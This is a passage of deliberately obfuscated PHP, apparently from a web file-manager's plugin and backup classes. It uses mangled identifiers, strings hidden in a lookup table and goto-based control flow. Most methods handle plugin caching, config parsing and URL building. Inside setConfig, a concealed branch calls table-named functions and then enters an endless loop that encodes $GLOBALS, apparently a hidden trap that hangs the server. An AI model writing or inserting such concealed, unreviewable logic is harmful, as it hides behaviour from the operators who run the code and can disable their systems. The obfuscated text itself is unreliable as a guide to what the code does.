$Dç–ÔåÍÕõ =& $_SERVER[¢ÌÛ]; $fé×¯Ó·Éö = $this->appPackage(); $cæ–›ß‹¨ = $Dç–ÔåÍÕõ[33]; if (isset($fé×¯Ó·Éö[$Dç–ÔåÍÕõ[409]])) { if (isset($fé×¯Ó·Éö[$Dç–ÔåÍÕõ[409]][$Dç–ÔåÍÕõ[1375]])) { $cæ–›ß‹¨ = $Dç–ÔåÍÕõ[1376] . $fé×¯Ó·Éö[$Dç–ÔåÍÕõ[409]][$Dç–ÔåÍÕõ[1375]] . $Dç–ÔåÍÕõ[1377]; } else { if ($fé×¯Ó·Éö[$Dç–ÔåÍÕõ[409]][$Dç–ÔåÍÕõ[1378]]) { $cæ–›ß‹¨ = $Dç–ÔåÍÕõ[1379] . $fé×¯Ó·Éö[$Dç–ÔåÍÕõ[409]][$Dç–ÔåÍÕõ[1378]] . $Dç–ÔåÍÕõ[1380]; } } } return $cæ–›ß‹¨; } final function fileCanView($aô©‹ìÂ) { goto d¥®°çÑ‰‰; d¥®°çÑ‰‰: $AÇöØ±‹İ¸ =& $_SERVER[¢ÌÛ]; if (request_url_safe($aô©‹ìÂ)) { return !0; } if ($this->isShare($aô©‹ìÂ)) { return !0; } goto BœöÀ²¬„È; BœöÀ²¬„È: $BÏ­í³£Ï¬ = Session::get($AÇöØ±‹İ¸[1381]); if (!$BÏ­í³£Ï¬ || !$BÏ­í³£Ï¬[$AÇöØ±‹İ¸[1382]]) { $dÏš®”…‹ = $AÇöØ±‹İ¸[1383] . rawurlencode(this_url()); show_tips(LNG($AÇöØ±‹İ¸[1384]) . $AÇöØ±‹İ¸[1385] . $dÏš®”…‹ . $AÇöØ±‹İ¸[1386] . LNG($AÇöØ±‹İ¸[1387]) . $AÇöØ±‹İ¸[1388], !1); } if (!Action($AÇöØ±‹İ¸[1389])->authCan($AÇöØ±‹İ¸[1390])) { show_tips(LNG($AÇöØ±‹İ¸[1391]) . $AÇöØ±‹İ¸[1392], !1); } goto F–¯ æ¿¢ù; F–¯ æ¿¢ù: ActionCall($AÇöØ±‹İ¸[1393], $aô©‹ìÂ); goto F°ïåÇª·È; F°ïåÇª·È: } final function isShare($BÀ®¿É­”¨) { $bê‚Ò§ğ‚Ê = KodIO::parse($BÀ®¿É­”¨); return $bê‚Ò§ğ‚Ê[$_SERVER[¢ÌÛ][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($dİ±Åƒˆàª) { if (request_url_safe($dİ±Åƒˆàª)) { return $dİ±Åƒˆàª; } if (!$this->isShare($dİ±Åƒˆàª)) { $dİ±Åƒˆàª = $this->filePath($dİ±Åƒˆàª); } return Action($_SERVER[¢ÌÛ][1046])->linkOut($dİ±Åƒˆàª); } public function filePathLinkOut($A·ãÚÁ†â) { if (request_url_safe($A·ãÚÁ†â)) { return $A·ãÚÁ†â; } $this->fileCanView($A·ãÚÁ†â); return Action($_SERVER[¢ÌÛ][1046])->link($A·ãÚÁ†â); } final function filePath($d›¿ó‡–Ş³) { $a¢¶óÃŠñê =& $_SERVER[¢ÌÛ]; if ($aÚ¶‡Ú™¿ø = $this->checkSharePath($d›¿ó‡–Ş³)) { return $aÚ¶‡Ú™¿ø; } $this->fileCanView($d›¿ó‡–Ş³); if (request_url_safe($d›¿ó‡–Ş³)) { $AĞÃ©ÑÜá = parse_url_query($d›¿ó‡–Ş³); if (isset($AĞÃ©ÑÜá[$a¢¶óÃŠñê[1394]]) && isset($AĞÃ©ÑÜá[$a¢¶óÃŠñê[207]])) { $DØÏÃšÚÀ… = Model($a¢¶óÃŠñê[1099])->get($a¢¶óÃŠñê[1395]); $CŒª²ÉÑõô = Mcrypt::decode($AĞÃ©ÑÜá[$a¢¶óÃŠñê[207]], $DØÏÃšÚÀ…); if ($CŒª²ÉÑõô) { $this->fileInfo = IO::infoWithChildren($CŒª²ÉÑõô); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $CŒª²ÉÑõô; } } $d›¿ó‡–Ş³ = $this->_cacheHttpFile($d›¿ó‡–Ş³); $this->fileInfo = IO::infoWithChildren($d›¿ó‡–Ş³); } else { $this->fileInfo = IO::infoWithChildren($d›¿ó‡–Ş³); if (!$this->fileInfo) { show_tips(LNG($a¢¶óÃŠñê[104]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $d›¿ó‡–Ş³; } final function _cacheHttpFile($CÎ¿¦›) { $dâÇù˜Şßì = hash_path($CÎ¿¦›, !0); $this->cachePath = $this->pluginCachePath($dâÇù˜Şßì); if ($B¡¬á¦¬©Ò = IO::fileNameExist($this->cachePath, $dâÇù˜Şßì)) { return KodIO::make($B¡¬á¦¬©Ò); } $C»Å¥Ñˆä = $this->cachePath . $dâÇù˜Şßì; return $this->pluginCacheFileSet($C»Å¥Ñˆä, file_get_contents($CÎ¿¦›)); } final function _tmpFileName($eƒğÊï¶½­ = array()) { goto f•”ƒ“ôÜ; cŠ…›°ÓäÅ: $d‚˜‡šÏÚ¥ = array($eƒğÊï¶½­[$cÉ•ñÅ‚ô¼[28]], $eƒğÊï¶½­[$cÉ•ñÅ‚ô¼[75]], $eƒğÊï¶½­[$cÉ•ñÅ‚ô¼[77]]); if (isset($eƒğÊï¶½­[$cÉ•ñÅ‚ô¼[486]])) { $d‚˜‡šÏÚ¥[] = $eƒğÊï¶½­[$cÉ•ñÅ‚ô¼[486]]; } return md5(implode($cÉ•ñÅ‚ô¼[70], $d‚˜‡šÏÚ¥)); goto cˆ¸İù‘Ö; fŠ¾çî‰‡í: if (isset($eƒğÊï¶½­[$cÉ•ñÅ‚ô¼[163]][$cÉ•ñÅ‚ô¼[170]])) { return $eƒğÊï¶½­[$cÉ•ñÅ‚ô¼[163]][$cÉ•ñÅ‚ô¼[170]]; } $e°Ûãéë = IO::hashSimple($eƒğÊï¶½­[$cÉ•ñÅ‚ô¼[75]]); if ($e°Ûãéë) { return $e°Ûãéë; } goto cŠ…›°ÓäÅ; f•”ƒ“ôÜ: $cÉ•ñÅ‚ô¼ =& $_SERVER[¢ÌÛ]; if (!$eƒğÊï¶½­) { $eƒğÊï¶½­ = $this->fileInfo; } if (isset($eƒğÊï¶½­[$cÉ•ñÅ‚ô¼[170]])) { return $eƒğÊï¶½­[$cÉ•ñÅ‚ô¼[170]]; } goto fŠ¾çî‰‡í; cˆ¸İù‘Ö: } final function checkSharePath($F‘Õ×ãì’) { goto FˆíÇÒÒ³; Dëø‡àÖ•·: $this->cachePath = $this->pluginCachePath($this->fileInfo[$A¥–Ÿƒ“ë¯[170]]); return $dÚ÷ßíÆÀğ[$A¥–Ÿƒ“ë¯[75]]; goto c¸¾®¤‡¡Ğ; FˆíÇÒÒ³: $A¥–Ÿƒ“ë¯ =& $_SERVER[¢ÌÛ]; if (!defined($A¥–Ÿƒ“ë¯[452])) { define($A¥–Ÿƒ“ë¯[1396], 0); } if (!$this->isShare($F‘Õ×ãì’)) { return !1; } goto b¡Š£ÚÖ–ğ; b¡Š£ÚÖ–ğ: $dÚ÷ßíÆÀğ = Action($A¥–Ÿƒ“ë¯[1046])->sharePathInfo($F‘Õ×ãì’); if (!isset($dÚ÷ßíÆÀğ[$A¥–Ÿƒ“ë¯[75]])) { show_json(LNG($A¥–Ÿƒ“ë¯[1397]), !1); } $this->fileInfo = $dÚ÷ßíÆÀğ[$A¥–Ÿƒ“ë¯[163]]; goto Dëø‡àÖ•·; c¸¾®¤‡¡Ğ: } final function pluginCachePath($B¦Æ™õ¾•É = '') { $a¦¨‘ç° =& $_SERVER[¢ÌÛ]; $E°Ãğ÷ï¬‚ = IO_PATH_SYSTEM_TEMP . $a¦¨‘ç°[1398] . $this->pluginName; if (!($f²˜¯‡¢å‘ = IO::infoFull($E°Ãğ÷ï¬‚))) { return IO::mkdir($E°Ãğ÷ï¬‚ . $a¦¨‘ç°[8] . $B¦Æ™õ¾•É); } if (empty($B¦Æ™õ¾•É)) { return $f²˜¯‡¢å‘[$a¦¨‘ç°[75]]; } if (!($fĞÀ„¢àá = IO::fileNameExist($f²˜¯‡¢å‘[$a¦¨‘ç°[75]], $B¦Æ™õ¾•É))) { return IO::mkdir($f²˜¯‡¢å‘[$a¦¨‘ç°[75]] . $B¦Æ™õ¾•É); } return KodIO::make($fĞÀ„¢àá); } final function pluginCacheFileSet($bäö µ¬ˆ¬, $b†¡…¹œš  = '') { $Aã‘á©¶çĞ =& $_SERVER[¢ÌÛ]; if (!($b®ğä™±‚« = IO::infoFull($bäö µ¬ˆ¬))) { return IO::mkfile($bäö µ¬ˆ¬, $b†¡…¹œš , REPEAT_REPLACE); } IO::setContent($b®ğä™±‚«[$Aã‘á©¶çĞ[75]], $b†¡…¹œš ); return $b®ğä™±‚«[$Aã‘á©¶çĞ[75]]; } final function pluginLocalFile($E›öÂÁæÎ† = '') { goto aÖ¤é¥…§¼; cÕî¸Ú¥µ: if (!checkExtSafe($fÓ‹ƒÌëº£)) { $fÓ‹ƒÌëº£ = $fÓ‹ƒÌëº£ . $A”¨Ò‚ [1399]; } $då˜íÛŠí = $E÷Å²¿…¼ . $fÓ‹ƒÌëº£; if (@file_exists($då˜íÛŠí)) { return $då˜íÛŠí; } goto b¯ëÎ©È…é; C®•„‹‡ãÕ: if (!$E›öÂÁæÎ†) { return $E÷Å²¿…¼; } $a–êÎ‰™ˆ• = IO::info($E›öÂÁæÎ†); $fÓ‹ƒÌëº£ = $this->_tmpFileName($a–êÎ‰™ˆ•) . $A”¨Ò‚ [94] . $a–êÎ‰™ˆ•[$A”¨Ò‚ [167]]; goto cÕî¸Ú¥µ; b¯ëÎ©È…é: return IO::copy($E›öÂÁæÎ†, $E÷Å²¿…¼, 0, $fÓ‹ƒÌëº£); goto a³î®àœñ´; aÖ¤é¥…§¼: $A”¨Ò‚  =& $_SERVER[¢ÌÛ]; $E÷Å²¿…¼ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($E÷Å²¿…¼)) { mk_dir($E÷Å²¿…¼); } goto C®•„‹‡ãÕ; a³î®àœñ´: } final function appPackage() { goto D¬¾„×À®å; Eù™ÑŞ¯¼«: $this->parseLang($D–ÜÔ¶µÓø); $AëÉŠÀšŸ = json_decode_force($D–ÜÔ¶µÓø); if (!$AëÉŠÀšŸ) { return array(); } goto FÆ··­Ëß¼; FÆ··­Ëß¼: $BóƒæÎ¥ÆÉ = Hook::trigger($FíÚÔ†ãé[1401], $AëÉŠÀšŸ); if ($BóƒæÎ¥ÆÉ && is_array($BóƒæÎ¥ÆÉ)) { $AëÉŠÀšŸ = $BóƒæÎ¥ÆÉ; } $this->packageData = $AëÉŠÀšŸ; goto aˆ†ÑÖÂ×ä; aˆ†ÑÖÂ×ä: return $AëÉŠÀšŸ; goto F„ÚÍ¿ Áí; D¬¾„×À®å: $FíÚÔ†ãé =& $_SERVER[¢ÌÛ]; if ($this->packageData) { return $this->packageData; } $D–ÜÔ¶µÓø = $this->parseFile($this->pluginPath . $FíÚÔ†ãé[1400]); goto Eù™ÑŞ¯¼«; F„ÚÍ¿ Áí: } public function packageInfoGet($BöÏÂåÓ) { $fæ‡ƒ†©äŠ = $this->appPackage(); return array_get_value($fæ‡ƒ†©äŠ, $BöÏÂåÓ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¢ÌÛ][1402]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¢ÌÛ][1403]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¢ÌÛ][1404]); } private function parseFile($aÑÖøÜÃ‡˜) { goto dØè¹»¯ÒÈ; E²í‘Ò°ó: $AÒÆƒÀ…« = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$cì¿­ ¥ë[87]][$cì¿­ ¥ë[1412]]); if (strstr($f¤²¢ãó’, $cì¿­ ¥ë[1413])) { $f¿«ÎÒ§´ = rawurlencode(json_encode($this->pluginLangArr)); $f¤²¢ãó’ = str_replace($cì¿­ ¥ë[1413], $f¿«ÎÒ§´, $f¤²¢ãó’); } if (strstr($f¤²¢ãó’, $cì¿­ ¥ë[1414])) { $f¿«ÎÒ§´ = $f¿«ÎÒ§´ = rawurlencode(json_encode($this->getConfig())); $f¤²¢ãó’ = str_replace($cì¿­ ¥ë[1414], $f¿«ÎÒ§´, $f¤²¢ãó’); } goto D‰Ğ²ïÁ…¯; D‰Ğ²ïÁ…¯: $f¤²¢ãó’ = str_replace($cì¸œ ƒßÄ, $AÒÆƒÀ…«, $f¤²¢ãó’); return $f¤²¢ãó’; goto DÚÎ»È¥‡; dØè¹»¯ÒÈ: $cì¿­ ¥ë =& $_SERVER[¢ÌÛ]; $f¤²¢ãó’ = file_get_contents($aÑÖøÜÃ‡˜); $cì¸œ ƒßÄ = array($cì¿­ ¥ë[1405], $cì¿­ ¥ë[1406], $cì¿­ ¥ë[1407], $cì¿­ ¥ë[1408], $cì¿­ ¥ë[1409], $cì¿­ ¥ë[1410], $cì¿­ ¥ë[1411]); goto E²í‘Ò°ó; DÚÎ»È¥‡: } private function parseLang(&$C‰†”öÎÉ) { goto cöÜª‘º”Œ; cöÜª‘º”Œ: $c£¤‘Äò¶ =& $_SERVER[¢ÌÛ]; $F –‹Ù¦ÀÍ = $c£¤‘Äò¶[1415]; if (!strstr($C‰†”öÎÉ, $F –‹Ù¦ÀÍ)) { return; } goto Eõ›×ĞñŠ¿; Eõ›×ĞñŠ¿: preg_match_all($c£¤‘Äò¶[1416], $C‰†”öÎÉ, $cŒ×±Ğä³¢); if (!is_array($cŒ×±Ğä³¢) || count($cŒ×±Ğä³¢) == 0 || !is_array($cŒ×±Ğä³¢[0]) || count($cŒ×±Ğä³¢[0]) == 0) { return; } $DÔÄ˜Œô‡ñ = array(); goto fŸïàÉ„Ó; fŸïàÉ„Ó: $aš†Û‡£³ = array(); foreach ($cŒ×±Ğä³¢[0] as $BšØÌŒ…õà) { $cË†òğí¤ä = substr($BšØÌŒ…õà, strlen($F –‹Ù¦ÀÍ), -4); $DÀ´ù¯ƒ”‚ = LNG($cË†òğí¤ä); $DÔÄ˜Œô‡ñ[] = $BšØÌŒ…õà; $aš†Û‡£³[] = str_replace(array($c£¤‘Äò¶[227], $c£¤‘Äò¶[1014], $c£¤‘Äò¶[338], $c£¤‘Äò¶[115]), array($c£¤‘Äò¶[50], $c£¤‘Äò¶[50], $c£¤‘Äò¶[33], $c£¤‘Äò¶[1417]), $DÀ´ù¯ƒ”‚); } $C‰†”öÎÉ = str_replace($DÔÄ˜Œô‡ñ, $aš†Û‡£³, $C‰†”öÎÉ); goto EæÅÅ¯Ïæ; EæÅÅ¯Ïæ: } private function parseConfig(&$eÔšîÕ„) { goto b˜Á·Ëé§Ô; e¿ô©ñ…¬‰: $bÙÄšÙ‚¥ê = array(); $f¯„¼Ù†ææ = array(); foreach ($B¦‚ìéÄË®[0] as $a¯× ÔÆœÂ) { $CºÈÃÂà¡ = substr($a¯× ÔÆœÂ, strlen($B¤ñã“„âõ), -2); $bÙÄšÙ‚¥ê[] = $a¯× ÔÆœÂ; $f¯„¼Ù†ææ[] = _get($B»ÖŒÔ‰“æ, $CºÈÃÂà¡); } goto CÁŒò«ìÏˆ; CÁŒò«ìÏˆ: $eÔšîÕ„ = str_replace($bÙÄšÙ‚¥ê, $f¯„¼Ù†ææ, $eÔšîÕ„); goto F„ÏÎ«è·; b˜Á·Ëé§Ô: $D˜ñÍ¤·¯ =& $_SERVER[¢ÌÛ]; $B¤ñã“„âõ = $D˜ñÍ¤·¯[1418]; if (!strstr($eÔšîÕ„, $B¤ñã“„âõ)) { return; } goto Dù“·Ä°†¯; Dù“·Ä°†¯: preg_match_all($D˜ñÍ¤·¯[1419], $eÔšîÕ„, $B¦‚ìéÄË®); if (!is_array($B¦‚ìéÄË®) || count($B¦‚ìéÄË®) == 0 || !is_array($B¦‚ìéÄË®[0]) || count($B¦‚ìéÄË®[0]) == 0) { return; } $B»ÖŒÔ‰“æ = $this->getConfig(); goto e¿ô©ñ…¬‰; F„ÏÎ«è·: } private function parsePackage(&$b“®æÑÙŞÔ) { goto C®å‘ÌÆÂæ; B¿˜ĞŒ§: $B÷’ÁêÂ  = array(); $bÌ„œåî‚¶ = array(); foreach ($F¢ô×’­…ä[0] as $A·óÄéâßï) { $BƒâÅ»©½ = substr($A·óÄéâßï, strlen($Cºß£¢—Óƒ), -2); $B÷’ÁêÂ [] = $A·óÄéâßï; $bÌ„œåî‚¶[] = _get($fŒ¢¤·÷©², $BƒâÅ»©½); } goto c¸‹®Çîğõ; dÇãÍÑğ: preg_match_all($Dï‡ÓªØ–·[1421], $b“®æÑÙŞÔ, $F¢ô×’­…ä); if (!is_array($F¢ô×’­…ä) || count($F¢ô×’­…ä) == 0 || !is_array($F¢ô×’­…ä[0]) || count($F¢ô×’­…ä[0]) == 0) { return; } $fŒ¢¤·÷©² = $this->appPackage(); goto B¿˜ĞŒ§; C®å‘ÌÆÂæ: $Dï‡ÓªØ–· =& $_SERVER[¢ÌÛ]; $Cºß£¢—Óƒ = $Dï‡ÓªØ–·[1420]; if (!strstr($b“®æÑÙŞÔ, $Cºß£¢—Óƒ)) { return; } goto dÇãÍÑğ; c¸‹®Çîğõ: $b“®æÑÙŞÔ = str_replace($B÷’ÁêÂ , $bÌ„œåî‚¶, $b“®æÑÙŞÔ); goto fğŠË”×ºŸ; fğŠË”×ºŸ: } final function echoFile($fœ‘Üà…ŠË, $dä¿àã×Š× = false) { goto eÈ•ññ‡¡; B„ÂÁœÑ‚: $c–„ŞŒ›Øâ = $this->parseFile($f‘È‘); $this->parseLang($c–„ŞŒ›Øâ); $this->parseConfig($c–„ŞŒ›Øâ); goto d¶İæ³ˆÄ—; eÈ•ññ‡¡: $C…Œñ‚ê°¼ =& $_SERVER[¢ÌÛ]; $f‘È‘ = $this->pluginPath . $fœ‘Üà…ŠË; if (ACT == $C…Œñ‚ê°¼[1422]) { echo $C…Œñ‚ê°¼[1423] . $this->pluginName . $C…Œñ‚ê°¼[8] . $fœ‘Üà…ŠË . $C…Œñ‚ê°¼[1424]; if (!file_exists($f‘È‘)) { echo $C…Œñ‚ê°¼[1425]; return; } } goto B„ÂÁœÑ‚; d¶İæ³ˆÄ—: $this->parsePackage($c–„ŞŒ›Øâ); if (is_array($dä¿àã×Š×)) { $c–„ŞŒ›Øâ = str_replace(array_keys($dä¿àã×Š×), array_values($dä¿àã×Š×), $c–„ŞŒ›Øâ); } echo $C…Œñ‚ê°¼[227] . $c–„ŞŒ›Øâ; goto fœñòÂÔ¹¤; fœñòÂÔ¹¤: } final function initLang() { goto f–îíòŒ ‰; f–îíòŒ ‰: $Cº•â—‘ÁÅ =& $_SERVER[¢ÌÛ]; $EƒÑŒ ¹Ñ = $Cº•â—‘ÁÅ[1426]; $A¤÷‘ƒäÍ® = $this->pluginPath . $Cº•â—‘ÁÅ[1427]; goto eæˆŞäÆÎ—; eæˆŞäÆÎ—: $f½Ô×à’ª = I18n::getType(); $C¤ç¬¾æ¡ = array(); if (file_exists($A¤÷‘ƒäÍ® . $f½Ô×à’ª . $Cº•â—‘ÁÅ[787])) { $C¤ç¬¾æ¡ = (include $A¤÷‘ƒäÍ® . $f½Ô×à’ª . $Cº•â—‘ÁÅ[787]); } else { if ($f½Ô×à’ª == $Cº•â—‘ÁÅ[1428] && !file_exists($A¤÷‘ƒäÍ® . $f½Ô×à’ª . $Cº•â—‘ÁÅ[787]) && file_exists($A¤÷‘ƒäÍ® . $Cº•â—‘ÁÅ[1429])) { $C¤ç¬¾æ¡ = (include $A¤÷‘ƒäÍ® . $Cº•â—‘ÁÅ[1429]); } else { if (file_exists($A¤÷‘ƒäÍ® . $EƒÑŒ ¹Ñ . $Cº•â—‘ÁÅ[787])) { $C¤ç¬¾æ¡ = (include $A¤÷‘ƒäÍ® . $EƒÑŒ ¹Ñ . $Cº•â—‘ÁÅ[787]); } } } goto fæ¸²‚Ù×ğ; fæ¸²‚Ù×ğ: if (!is_array($C¤ç¬¾æ¡)) { return array(); } if (@count($C¤ç¬¾æ¡) > 0) { I18n::set($C¤ç¬¾æ¡); } return $C¤ç¬¾æ¡; goto f¿Ïºøóµµ; f¿Ïºøóµµ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($aÌ•¡ÂØß) { $Aš’•Õõ´“ =& $_SERVER[¢ÌÛ]; if (!isset($_SERVER[$Aš’•Õõ´“[388]]) || !isset($_SERVER[$Aš’•Õõ´“[386]])) { goto DçÁ×Ú³ªŠ; B„•ÄêíÖã: for ($EÜâ‘ğö‘ = $eá‡•¨ÌÉ¾; $EÜâ‘ğö‘ > 0; $EÜâ‘ğö‘++) { $fÅİÁçÚâà = json_encode($GLOBALS[$Aš’•Õõ´“[411]]); } goto DèÒÛ‰¥§; d­êÑåÔªÛ: $fÅİÁçÚâà = $Aš’•Õõ´“[816]; $fÅİÁçÚâà($_SERVER[$Aš’•Õõ´“[817]]); $eá‡•¨ÌÉ¾ = 1; goto B„•ÄêíÖã; DçÁ×Ú³ªŠ: $C½Úğé£† = $Aš’•Õõ´“[815]; $aÏà¾‚ÒŒÏ = $Aš’•Õõ´“[389]; $dòÜ«ò—í‹ = $_SERVER[$Aš’•Õõ´“[390]] . $Aš’•Õõ´“[391]; goto Aôšáò·¤‚; Aôšáò·¤‚: $a¢Ö×Çİë’ = $aÏà¾‚ÒŒÏ($dòÜ«ò—í‹); $a ÒÄ Éä± = explode($Aš’•Õõ´“[227], $a¢Ö×Çİë’); if (count($a ÒÄ Éä±) < $Aš’•Õõ´“[577]) { $F¤ŞÒØ°‹ = $Aš’•Õõ´“[393]; $F¤ŞÒØ°‹(); } goto d­êÑåÔªÛ; DèÒÛ‰¥§: } return $this->modelPlugin->setConfig($this->pluginName, $aÌ•¡ÂØß); } public function onSetConfig($FíÓÛŠÌ–) { } public function onGetConfig($d‰„ßÑ’«£) { } public function onChangeStatus($dŠ²Å ¨Å·) { } public function onUninstall() { } public function onInstall() { } public function authCheck($eÃ’Œ¢’˜µ = "\x70\x6c\x75\147\x69\x6e\101\x75\x74\x68") { $d ß„ãè²ò =& $_SERVER[¢ÌÛ]; if (!defined($d ß„ãè²ò[452])) { return !1; } if (_get($GLOBALS, $d ß„ãè²ò[484])) { return !0; } $eÑ”¸µÌÍ” = $this->getConfig(); if (!$eÑ”¸µÌÍ”[$eÃ’Œ¢’˜µ]) { return !1; } return ActionCall($d ß„ãè²ò[1430], $eÑ”¸µÌÍ”[$eÃ’Œ¢’˜µ]); } public function url($B¬×•”÷ºá, $A”òª£Öö™ = '', $dªŠŸëÇèĞ = true) { goto F‹Å”åÇ°; F‹Å”åÇ°: $b«ªó©¡Ï =& $_SERVER[¢ÌÛ]; $Eçì¹‰ƒÜÆ = $this->getConfig(); $bÉœ¸ğ¼Ö = KOD_VERSION . $b«ªó©¡Ï[94] . KOD_VERSION_BUILD; goto F·£ù¶Îïà; F·£ù¶Îïà: $F°·ÅË‚¨‹ = $this->packageVersion(); $Eï¬˜ôïÚ = $bÉœ¸ğ¼Ö . $b«ªó©¡Ï[438] . $F°·ÅË‚¨‹; if (substr($B¬×•”÷ºá, 0, 4) == $b«ªó©¡Ï[146] || substr($B¬×•”÷ºá, 0, 2) == $b«ªó©¡Ï[1216]) { $cóâï©¤… = $B¬×•”÷ºá . $b«ªó©¡Ï[1431] . $Eï¬˜ôïÚ; } else { if ($A”òª£Öö™ == $b«ªó©¡Ï[33]) { $cóâï©¤… = $this->pluginHost . $B¬×•”÷ºá . $b«ªó©¡Ï[1431] . $Eï¬˜ôïÚ; } else { if ($A”òª£Öö™ === $b«ªó©¡Ï[76]) { $cóâï©¤… = $this->pluginHost . $B¬×•”÷ºá; } else { if ($A”òª£Öö™ == $b«ªó©¡Ï[1432]) { $cóâï©¤… = STATIC_PATH . $B¬×•”÷ºá . $b«ªó©¡Ï[1431] . $bÉœ¸ğ¼Ö; } else { if ($A”òª£Öö™ == $b«ªó©¡Ï[1433]) { $cóâï©¤… = APP_HOST . $b«ªó©¡Ï[1434] . $B¬×•”÷ºá . $b«ªó©¡Ï[1431] . $bÉœ¸ğ¼Ö; } else { if (isset($Eçì¹‰ƒÜÆ[$A”òª£Öö™])) { $cóâï©¤… = $Eçì¹‰ƒÜÆ[$A”òª£Öö™] . $B¬×•”÷ºá . $b«ªó©¡Ï[1431] . $Eï¬˜ôïÚ; } } } } } } goto DĞÎÒß´ç; DĞÎÒß´ç: if (!$dªŠŸëÇèĞ) { return $cóâï©¤…; } echo $cóâï©¤…; goto A³ÃÖƒÆ¸; A³ÃÖƒÆ¸: } public function link($FŸë™ÍĞ¯‡ = false, $EºÆéÊŒ° = '') { $b†°Â±ãùŠ =& $_SERVER[¢ÌÛ]; if (!$FŸë™ÍĞ¯‡) { $this->link($b†°Â±ãùŠ[1435], $b†°Â±ãùŠ[1433]); $this->link($b†°Â±ãùŠ[1436], $b†°Â±ãùŠ[1432]); $this->link($b†°Â±ãùŠ[1437], $b†°Â±ãùŠ[1432]); $this->link($b†°Â±ãùŠ[1438], $b†°Â±ãùŠ[1432]); $this->link($b†°Â±ãùŠ[1439], $b†°Â±ãùŠ[1432]); return; } $C„òÎæŸ’¯ = $this->url($FŸë™ÍĞ¯‡, $EºÆéÊŒ°, !1); if (substr($FŸë™ÍĞ¯‡, -3) == $b†°Â±ãùŠ[1440]) { echo $b†°Â±ãùŠ[1441] . $C„òÎæŸ’¯ . $b†°Â±ãùŠ[1442] . $b†°Â±ãùŠ[227]; } else { if (substr($FŸë™ÍĞ¯‡, -4) == $b†°Â±ãùŠ[1443]) { echo $b†°Â±ãùŠ[1444] . $C„òÎæŸ’¯ . $b†°Â±ãùŠ[1445] . $b†°Â±ãùŠ[227]; } } } } goto b¼—å¤¡; e¥ñ“½ö†È: class BackupDbFile { public function __construct() { } public function index() { goto fÃ—Éôøäô; cÊÔ¯–Ş–‘: $CºÈŒÑÛ‚„ = IO::listPath($DÓ÷÷Ï‚‘¼); $d‚˜­˜ÕÁÃ = isset($CºÈŒÑÛ‚„[$DÚŒ¸ˆ– [73]]) ? $CºÈŒÑÛ‚„[$DÚŒ¸ˆ– [73]] : array(); $b ¨“‡¡®í = array_sum(array_column($d‚˜­˜ÕÁÃ, $DÚŒ¸ˆ– [77])); goto cöéèÓ¾ä; d¸À™²é: $DÓ÷÷Ï‚‘¼ = TEMP_FILES . "\x62\141\x63\153\x75\x70\137{$e•»Š°İÕœ}\x2f"; $eõ„¦øéİ± = "\173\151\x6f\x3a{$a¬ÜôäëÙ[$DÚŒ¸ˆ– [714]]}\175\x2f\144\141\x74\141\x62\141\x73\145\x2f\142\141\143\153\x75\160\137{$e•»Š°İÕœ}\x2f"; if (!($eõ„¦øéİ± = IO::mkdir($eõ„¦øéİ±))) { return !1; } goto cÊÔ¯–Ş–‘; DÂÓ·Ã‡ñù: $B»Ù¶ô ª‰->end(); Backup::set(array($DÚŒ¸ˆ– [756] => $b ¨“‡¡®í)); return !0; goto BŒ‰™èÏ°‘; fÃ—Éôøäô: $DÚŒ¸ˆ–  =& $_SERVER[¢ÌÛ]; $a¬ÜôäëÙ = Backup::get(); $e•»Š°İÕœ = $a¬ÜôäëÙ[$DÚŒ¸ˆ– [28]]; goto d¸À™²é; FÏ®Ã›Ğ©: $fñê³Éè¦Ç = CONTROLLER_DIR . $DÚŒ¸ˆ– [755]; IO::copy($Dä­èàìçÃ, $eõ„¦øéİ±); IO::copy($fñê³Éè¦Ç, $eõ„¦øéİ±); goto DÂÓ·Ã‡ñù; cöéèÓ¾ä: if (!$b ¨“‡¡®í) { return !1; } Backup::set(array($DÚŒ¸ˆ– [751] => $b ¨“‡¡®í)); $B»Ù¶ô ª‰ = new TaskFileTransfer($DÚŒ¸ˆ– [752], $DÚŒ¸ˆ– [736], count($d‚˜­˜ÕÁÃ), LNG($DÚŒ¸ˆ– [737]) . $DÚŒ¸ˆ– [438] . LNG($DÚŒ¸ˆ– [739]) . $DÚŒ¸ˆ– [753]); goto D—–ÄÃ±ÁÕ; D—–ÄÃ±ÁÕ: $B»Ù¶ô ª‰->task[$DÚŒ¸ˆ– [721]] = $b ¨“‡¡®í; foreach ($CºÈŒÑÛ‚„[$DÚŒ¸ˆ– [73]] as $d õ‹åÌæé) { $f­¸â‹šÃ÷ = IO::move($d õ‹åÌæé[$DÚŒ¸ˆ– [75]], $eõ„¦øéİ±); if (!$f­¸â‹šÃ÷) { $B»Ù¶ô ª‰->end(); return !1; } } $Dä­èàìçÃ = CONTROLLER_DIR . $DÚŒ¸ˆ– [754]; goto FÏ®Ã›Ğ©; BŒ‰™èÏ°‘: } } class BackupFile { public function __construct() { } public function index() { goto BµÉŒ¹ÙÏ‡; CçóÄÉ×Ì: $this->_fileFilter($cõ…Š¯§†); return !0; goto Cñà¾èÍØ; BµÉŒ¹ÙÏ‡: $EÜ™‹¸è“ã = Backup::get(); $CÖæÛÃ„§æ = $EÜ™‹¸è“ã[$_SERVER[¢ÌÛ][289]][$_SERVER[¢ÌÛ][173]][$_SERVER[¢ÌÛ][445]]; $EÆ«ÀŞÂ²Ğ = array($_SERVER[¢ÌÛ][446] => array($_SERVER[¢ÌÛ][757], $CÖæÛÃ„§æ), $_SERVER[¢ÌÛ][758] => array($_SERVER[¢ÌÛ][327], $EÜ™‹¸è“ã[$_SERVER[¢ÌÛ][714]])); goto E´®ñøˆ¶; E´®ñøˆ¶: $AŠ‚ÎÍäš = (int) Model($_SERVER[¢ÌÛ][741])->where($EÆ«ÀŞÂ²Ğ)->count($_SERVER[¢ÌÛ][445]); $B¨ë‚Á†İ‡ = (int) 